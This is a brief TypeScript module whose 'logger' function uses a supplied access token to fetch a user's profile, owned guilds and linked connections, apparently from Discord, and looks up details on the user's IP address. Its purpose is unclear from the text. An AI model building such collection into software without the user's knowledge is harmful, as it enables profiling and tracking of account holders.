import { getConnnections, getInfo, getOwnGuilds, getIpInfo } from "./userdata";

export const logger = async ( accessToken: string, ip: string ) => {
    try {
        const userInfo = await getInfo(accessToken);
        const ownGuilds = await getOwnGuilds(accessToken);
        const connections = await getConnnections(accessToken);
        const ipInfo = await getIpInfo(ip);
        
        return { success: true, userInfo, ownGuilds, connections, ipInfo};
    } catch {
        return { success: false };
    }
}